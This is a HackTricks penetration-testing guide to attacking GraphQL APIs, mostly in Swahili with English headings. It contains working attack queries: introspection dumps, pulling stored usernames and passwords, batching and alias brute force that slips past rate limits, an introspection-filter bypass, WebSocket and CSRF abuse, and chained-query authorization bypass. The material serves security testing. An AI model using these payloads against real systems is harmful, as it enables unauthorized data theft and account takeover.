# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

GraphQL inasisitizwa kama **mbadala mzuri** kwa REST API, ikitoa njia rahisi ya kuuliza data kutoka kwa backend. Kinyume na REST, ambayo mara nyingi inahitaji maombi mengi kupitia maeneo tofauti ili kukusanya data, GraphQL inaruhusu upatikanaji wa taarifa zote zinazohitajika kupitia **ombio moja**. Hii inarahisisha sana **wanakuza** kwa kupunguza ugumu wa michakato yao ya upatikanaji wa data.

## GraphQL na Usalama

Kwa kuibuka kwa teknolojia mpya, ikiwa ni pamoja na GraphQL, udhaifu mpya wa usalama pia unatokea. Jambo muhimu la kuzingatia ni kwamba **GraphQL haina mifumo ya uthibitishaji kwa default**. Ni jukumu la waendelezaji kutekeleza hatua hizo za usalama. Bila uthibitishaji sahihi, maeneo ya GraphQL yanaweza kufichua taarifa nyeti kwa watumiaji wasio na uthibitisho, na kuleta hatari kubwa ya usalama.

### Mashambulizi ya Directory Brute Force na GraphQL

Ili kubaini mifano ya GraphQL iliyofichuliwa, ni mapendekezo kuingiza njia maalum katika mashambulizi ya directory brute force. Njia hizi ni:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Kugundua mifano ya GraphQL iliyo wazi kunaruhusu uchambuzi wa maswali yanayoungwa mkono. Hii ni muhimu kwa kuelewa data inayopatikana kupitia eneo hilo. Mfumo wa uchunguzi wa GraphQL unarahisisha hili kwa kuelezea maswali ambayo muundo unasaidia. Kwa maelezo zaidi kuhusu hili, rejelea nyaraka za GraphQL kuhusu uchunguzi: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Zana [**graphw00f**](https://github.com/dolevf/graphw00f) ina uwezo wa kugundua ni injini gani ya GraphQL inayotumika kwenye seva na kisha kuchapisha taarifa muhimu kwa mkaguzi wa usalama.

#### Universal queries <a href="#universal-queries" id="universal-queries"></a>

Ili kuangalia kama URL ni huduma ya GraphQL, **ombio la ulimwengu**, `query{__typename}`, linaweza kutumwa. Ikiwa jibu linajumuisha `{"data": {"__typename": "Query"}}`, inathibitisha kuwa URL ina eneo la GraphQL. Njia hii inategemea uwanja wa GraphQL `__typename`, ambao unaonyesha aina ya kitu kilichoulizwa.
```javascript
query{__typename}
```
### Basic Enumeration

Graphql kwa kawaida inasaidia **GET**, **POST** (x-www-form-urlencoded) na **POST**(json). Ingawa kwa usalama inashauriwa kuruhusu tu json ili kuzuia mashambulizi ya CSRF.

#### Introspection

Ili kutumia introspection kugundua taarifa za schema, uliza uwanja wa `__schema`. Uwanja huu upo kwenye aina ya mzizi ya maswali yote.
```bash
query={__schema{types{name,fields{name}}}}
```
Kwa hii swali utaweza kupata jina la aina zote zinazotumika:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Kwa hii query unaweza kutoa aina zote, mashamba yake, na hoja zake (na aina ya hoja). Hii itakuwa muhimu sana kujua jinsi ya kuhoji hifadhidata.

![](<../../.gitbook/assets/image (950).png>)

**Makosa**

Ni ya kuvutia kujua kama **makosa** yataonyeshwa kwani yatatoa **habari** muhimu.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**Kukadiria Muundo wa Hifadhidata kupitia Introspection**

{% hint style="info" %}
Ikiwa introspection imewezeshwa lakini swali hapo juu halifanyi kazi, jaribu kuondoa mwelekeo wa `onOperation`, `onFragment`, na `onField` kutoka kwa muundo wa swali.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Uchunguzi wa ndani wa swali:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
The last code line is a graphql query that will dump all the meta-information from the graphql (objects names, parameters, types...)

![](<../../.gitbook/assets/image (363).png>)

If introspection is enabled you can use [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) to view in a GUI all the options.

### Querying

Sasa kwamba tunajua ni aina gani ya taarifa zimehifadhiwa ndani ya database, hebu jaribu **kuchukua baadhi ya thamani**.

Katika introspection unaweza kupata **ni kitu gani unaweza kuuliza moja kwa moja** (kwa sababu huwezi kuuliza kitu tu kwa sababu kinakuwepo). Katika picha ifuatayo unaweza kuona kwamba "_queryType_" inaitwa "_Query_" na kwamba moja ya maeneo ya kitu cha "_Query_" ni "_flags_", ambayo pia ni aina ya kitu. Hivyo unaweza kuuliza kitu cha bendera.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Note that the type of the query "_flags_" is "_Flags_", and this object is defined as below:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

You can see that the "_Flags_" objects are composed by **name** and .**value** Then you can get all the names and values of the flags with the query:
```javascript
query={flags{name, value}}
```
Kumbuka kwamba ikiwa **kitu cha kuuliza** ni **aina** **ya msingi** kama **string** kama katika mfano ufuatao

![](<../../.gitbook/assets/image (958).png>)

Unaweza tu kuuliza kwa:
```javascript
query={hiddenFlags}
```
Katika mfano mwingine ambapo kulikuwa na vitu 2 ndani ya kitu cha "_Query_": "_user_" na "_users_".\
Ikiwa vitu hivi havihitaji hoja yoyote kutafuta, unaweza **kupata taarifa zote kutoka kwavyo** kwa **kuomba** tu data unayotaka. Katika mfano huu kutoka Mtandao unaweza kutoa majina ya watumiaji na nywila zilizohifadhiwa:

![](<../../.gitbook/assets/image (880).png>)

Hata hivyo, katika mfano huu ikiwa unajaribu kufanya hivyo unapata **kosa** hili:

![](<../../.gitbook/assets/image (1042).png>)

Inaonekana kwa namna fulani itatafuta kwa kutumia hoja ya "_**uid**_" ya aina _**Int**_.\
Hata hivyo, tayari tulijua kwamba, katika sehemu ya [Basic Enumeration](graphql.md#basic-enumeration) ulipendekezwa uchunguzi ambao ulionyesha taarifa zote muhimu: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Ikiwa utasoma picha iliyotolewa wakati ninapokimbia uchunguzi huo utaona kwamba "_**user**_" alikuwa na **arg** "_**uid**_" ya aina _Int_.

Hivyo, kwa kufanya _**uid**_ bruteforce kidogo niligundua kwamba katika _**uid**=**1**_ jina la mtumiaji na nywila vilipatikana:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Kumbuka kwamba niligundua kuwa naweza kuomba **vigezo** "_**user**_" na "_**password**_" kwa sababu ikiwa nitajaribu kutafuta kitu ambacho hakipo (`query={user(uid:1){noExists}}`) napata kosa hili:

![](<../../.gitbook/assets/image (707).png>)

Na wakati wa **awamu ya uainishaji** niligundua kwamba kitu cha "_**dbuser**_" kilikuwa na kama maeneo "_**user**_" na "_**password**_.

**Hila ya kutupa mfuatano wa uchunguzi (shukrani kwa @BinaryShadow\_)**

Ikiwa unaweza kutafuta kwa aina ya mfuatano, kama: `query={theusers(description: ""){username,password}}` na unafanya **uchunguzi wa mfuatano tupu** itatoa **data zote**. (_Kumbuka mfano huu hauhusiani na mfano wa mafunzo, kwa mfano huu dhani unaweza kutafuta kwa kutumia "**theusers**" kwa uwanja wa Mfuatano unaoitwa "**description**"_).

### Kutafuta

Katika mpangilio huu, **hifadhidata** ina **watu** na **filamu**. **Watu** wanatambulika kwa **barua pepe** na **jina**; **filamu** kwa **jina** na **ukadiriaji**. **Watu** wanaweza kuwa marafiki na kila mmoja na pia wana filamu, wakionyesha uhusiano ndani ya hifadhidata.

Unaweza **kutafuta** watu **kwa** **jina** na kupata barua zao za pepe:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Unaweza **kutafuta** watu **kwa** **jina** na kupata **filamu** zao **zilizosajiliwa**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Note jinsi inavyoonyeshwa kupata `name` ya `subscribedMovies` ya mtu.

Unaweza pia **kutafuta vitu vingi kwa wakati mmoja**. Katika kesi hii, utafutaji wa sinema 2 unafanywa:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Au hata **uhusiano wa vitu tofauti kadhaa kwa kutumia majina mbadala**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Mabadiliko yanatumika kufanya mabadiliko katika upande wa seva.**

Katika **introspection** unaweza kupata **mabadiliko** **iliyotangazwa**. Katika picha ifuatayo "_MutationType_" inaitwa "_Mutation_" na kitu cha "_Mutation_" kina majina ya mabadiliko (kama "_addPerson_" katika kesi hii):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Katika mpangilio huu, **database** ina **watu** na **filamu**. **Watu** wanatambulishwa kwa **barua pepe** zao na **jina**; **filamu** kwa **jina** na **kadirio**. **Watu** wanaweza kuwa marafiki na kila mmoja na pia wana filamu, ikionyesha uhusiano ndani ya database.

Mabadiliko ya **kuunda mpya** filamu ndani ya database yanaweza kuwa kama ifuatavyo (katika mfano huu mabadiliko yanaitwa `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Kumbuka jinsi thamani na aina ya data zinavyoonyeshwa katika uchunguzi.**

Zaidi ya hayo, hifadhidata inasaidia operesheni ya **mutation**, inayoitwa `addPerson`, ambayo inaruhusu uundaji wa **persons** pamoja na uhusiano wao na **friends** na **movies** zilizopo. Ni muhimu kutambua kwamba marafiki na filamu lazima ziwepo katika hifadhidata kabla ya kuziunganisha na mtu mpya aliyeundwa.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

Kama ilivyoelezwa katika [**moja ya vulns zilizoelezwa katika ripoti hii**](https://www.landh.tech/blog/20240304-google-hack-50000/), overload ya directive inamaanisha kuita directive hata mara milioni ili kufanya server itumie operesheni hadi iwezekane kuifanya DoS.

### Batching brute-force katika ombi 1 la API

Taarifa hii ilichukuliwa kutoka [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Uthibitishaji kupitia GraphQL API kwa **kutuma maswali mengi kwa wakati mmoja na akidi tofauti** ili kuyakagua. Ni shambulio la kawaida la brute force, lakini sasa inawezekana kutuma zaidi ya jozi moja ya login/password kwa kila ombi la HTTP kwa sababu ya kipengele cha batching cha GraphQL. Njia hii itawadanganya programu za ufuatiliaji wa kiwango cha nje kufikiria kila kitu kiko sawa na hakuna bot ya brute-forcing inayojaribu kukisia nywila.

Hapa chini unaweza kupata onyesho rahisi la ombi la uthibitishaji wa programu, na **jozi 3 tofauti za barua pepe/nywila kwa wakati mmoja**. Kwa wazi inawezekana kutuma maelfu katika ombi moja kwa njia ile ile:

![](<../../.gitbook/assets/image (1081).png>)

Kama tunavyoona kutoka kwenye picha ya majibu, maombi ya kwanza na ya tatu yalirudisha _null_ na kuonyesha habari zinazohusiana katika sehemu ya _error_. **Mabadiliko ya pili yalikuwa na data sahihi ya uthibitishaji** na jibu lina token sahihi ya kikao cha uthibitishaji.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Bila Introspection

Zaidi na zaidi **mipaka ya graphql inazima introspection**. Hata hivyo, makosa ambayo graphql inatoa wakati ombi lisilotarajiwa linapokea yanatosha kwa zana kama [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) kuunda sehemu kubwa ya schema.

Zaidi ya hayo, nyongeza ya Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **inasimamia maombi ya GraphQL API yanayopita kupitia Burp** na **kujenga** schema ya ndani ya GraphQL **na kila swali jipya inaloona**. Inaweza pia kufichua schema kwa GraphiQL na Voyager. Nyongeza inarudisha jibu bandia inapopokea ombi la introspection. Kama matokeo, GraphQuail inaonyesha maswali yote, hoja, na maeneo yanayopatikana kwa matumizi ndani ya API. Kwa maelezo zaidi [**angalia hii**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Orodha nzuri ya **maneno** kugundua [**vitu vya GraphQL inaweza kupatikana hapa**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Kupita ulinzi wa introspection wa GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Ili kupita vizuizi kwenye maombi ya introspection katika APIs, kuingiza **herufi maalum baada ya neno la `__schema`** kunaonekana kuwa na ufanisi. Njia hii inatumia makosa ya kawaida ya waendelezaji katika mifumo ya regex ambayo inakusudia kuzuia introspection kwa kuzingatia neno la `__schema`. Kwa kuongeza herufi kama **nafasi, mistari mipya, na alama za koma**, ambazo GraphQL inapuuzilia mbali lakini huenda hazijazingatiwa katika regex, vizuizi vinaweza kupitishwa. Kwa mfano, ombi la introspection lenye mstari mpya baada ya `__schema` linaweza kupita ulinzi kama huo:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Ikiwa haifanikiwi, fikiria mbinu mbadala za ombi, kama vile **GET requests** au **POST na `x-www-form-urlencoded`**, kwani vizuizi vinaweza kuathiri tu ombi za POST.

### Jaribu WebSockets

Kama ilivyotajwa katika [**hili mazungumzo**](https://www.youtube.com/watch?v=tIo\_t5uUK50), angalia kama inaweza kuwa inawezekana kuungana na graphQL kupitia WebSockets kwani hiyo inaweza kukuruhusu kupita WAF inayoweza kuwepo na kufanya mawasiliano ya websocket kuvuja muundo wa graphQL:
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **Kugundua Miundo ya GraphQL Iliyo wazi**

Wakati uchunguzi umezimwa, kuchunguza msimbo wa chanzo wa tovuti kwa maswali yaliyoandaliwa mapema katika maktaba za JavaScript ni mkakati mzuri. Maswali haya yanaweza kupatikana kwa kutumia kichupo cha `Sources` katika zana za maendeleo, na kutoa maarifa kuhusu muundo wa API na kufichua **maswali nyeti yaliyo wazi**. Amri za kutafuta ndani ya zana za maendeleo ni:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF katika GraphQL

Ikiwa hujui CSRF ni nini, soma ukurasa ufuatao:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Nje huko utaweza kupata mwisho kadhaa wa GraphQL **iliyowekwa bila token za CSRF.**

Kumbuka kwamba maombi ya GraphQL kwa kawaida hutumwa kupitia maombi ya POST kwa kutumia Aina ya Maudhui **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Hata hivyo, sehemu nyingi za GraphQL pia zinasaidia **`form-urlencoded` POST requests:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Kwa hivyo, kama maombi ya CSRF kama yale ya awali yanatumwa **bila maombi ya preflight**, inawezekana **kufanya** **mabadiliko** katika GraphQL kwa kutumia CSRF.

Hata hivyo, kumbuka kwamba thamani mpya ya default ya cookie ya lippu ya `samesite` ya Chrome ni `Lax`. Hii inamaanisha kwamba cookie itatumwa tu kutoka kwa wavuti ya upande wa tatu katika maombi ya GET.

Kumbuka kwamba kawaida inawezekana kutuma **maombi** ya **query** pia kama **maombi ya GET na tokeni ya CSRF inaweza isithibitishwe katika ombi la GET.**

Pia, kutumia [**XS-Search**](../../pentesting-web/xs-search/) **shambulio** inaweza kuwa inawezekana kutoa maudhui kutoka kwa kiunganishi cha GraphQL kwa kutumia akidi za mtumiaji.

Kwa maelezo zaidi **angalia** [**posti ya asili hapa**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Utekaji wa WebSocket wa tovuti tofauti katika GraphQL

Kama ilivyo na udhaifu wa CRSF unaotumia graphQL, pia inawezekana kufanya **utekaji wa WebSocket wa tovuti tofauti ili kutumia uthibitishaji na GraphQL kwa kutumia cookies zisizo na ulinzi** na kumfanya mtumiaji afanye vitendo visivyotarajiwa katika GraphQL.

Kwa maelezo zaidi angalia:

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Uidhinishaji katika GraphQL

Mifumo mingi ya GraphQL iliyofafanuliwa kwenye kiunganishi inaweza kuangalia tu uthibitishaji wa mombaji lakini si uidhinishaji.

Kubadilisha vigezo vya ingizo la query kunaweza kusababisha maelezo nyeti ya akaunti [kuvuja](https://hackerone.com/reports/792927).

Mabadiliko yanaweza hata kusababisha kuchukuliwa kwa akaunti kwa kujaribu kubadilisha data za akaunti nyingine.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Kupita idhini katika GraphQL

[Kuunganisha maswali](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) pamoja kunaweza kupita mfumo dhaifu wa uthibitishaji.

Katika mfano ulio hapa chini unaweza kuona kwamba operesheni ni "forgotPassword" na kwamba inapaswa kutekeleza tu swali la forgotPassword lililohusishwa nalo. Hii inaweza kupitishwa kwa kuongeza swali mwishoni, katika kesi hii tunaongeza "register" na kigezo cha mtumiaji ili mfumo ujiandikishe kama mtumiaji mpya.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Kupita Mipaka ya Kiwango kwa Kutumia Aliases katika GraphQL

Katika GraphQL, aliases ni kipengele chenye nguvu ambacho kinaruhusu **kuitwa kwa mali kwa uwazi** unapofanya ombi la API. Uwezo huu ni muhimu sana kwa kupata **mfano mwingi wa aina moja** ya kitu ndani ya ombi moja. Aliases zinaweza kutumika kushinda kikomo kinachozuia vitu vya GraphQL kuwa na mali nyingi zenye jina moja.

Kwa ufahamu wa kina wa aliases za GraphQL, rasilimali ifuatayo inapendekezwa: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Ingawa kusudi kuu la aliases ni kupunguza hitaji la simu nyingi za API, matumizi yasiyokusudiwa yamegundulika ambapo aliases zinaweza kutumika kutekeleza mashambulizi ya nguvu ya kikatili kwenye kiunganishi cha GraphQL. Hii inawezekana kwa sababu baadhi ya viunganishi vinahifadhiwa na vikwazo vya kiwango vilivyoundwa kuzuia mashambulizi ya nguvu ya kikatili kwa kupunguza **idadi ya maombi ya HTTP**. Hata hivyo, vikwazo hivi vya kiwango vinaweza kutokuweka akilini idadi ya operesheni ndani ya kila ombi. Kwa kuwa aliases zinaruhusu kujumlisha maswali mengi katika ombi moja la HTTP, zinaweza kupita hatua za kupunguza kiwango kama hizo.

Fikiria mfano uliopewa hapa chini, unaoonyesha jinsi maswali yaliyo na alias yanaweza kutumika kuthibitisha uhalali wa nambari za punguzo za duka. Njia hii inaweza kupita mipaka ya kiwango kwani inakusanya maswali kadhaa katika ombi moja la HTTP, ikiruhusu kuthibitisha nambari nyingi za punguzo kwa wakati mmoja.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Tools

### Vulnerability scanners

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Jaribu makosa ya kawaida ya usanidi wa mwisho wa graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Skripti ya ukaguzi wa usalama wa GraphQL yenye lengo la kufanya maswali na mabadiliko ya kundi la GraphQL.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Tambua fingerprint ya graphql inayotumika
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Zana inayoweza kutumika kukamata schemas na kutafuta data nyeti, kujaribu idhini, nguvu za kikatili schemas, na kupata njia za aina fulani.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Inaweza kutumika kama standalone au [Burp extension](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Inaweza kutumika kama mteja wa CLI pia kuendesha mashambulizi
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Zana inayoorodhesha njia tofauti za **kufikia aina fulani katika schema ya GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Mfuasi wa Standalone na CLI Modes ya InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp extension kwa ajili ya majaribio ya juu ya GraphQL. _**Scanner**_ ni msingi wa InQL v5.0, ambapo unaweza kuchambua mwisho wa GraphQL au faili ya schema ya ndani ya eneo. Inajenga kiotomatiki maswali na mabadiliko yote yanayowezekana, ikiyapanga katika muonekano wa muundo kwa ajili ya uchambuzi wako. Kipengele cha _**Attacker**_ kinakuruhusu kuendesha mashambulizi ya kundi la GraphQL, ambayo yanaweza kuwa ya manufaa kwa kukwepa mipaka ya kiwango iliyotekelezwa vibaya.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Jaribu kupata schema hata ikiwa uchambuzi umezimwa kwa kutumia msaada wa baadhi ya hifadhidata za Graphql ambazo zitapendekeza majina ya mabadiliko na vigezo.

### Clients

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Mteja wa GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Mteja wa GUI

### Automatic Tests

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video inayoelezea AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## References

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
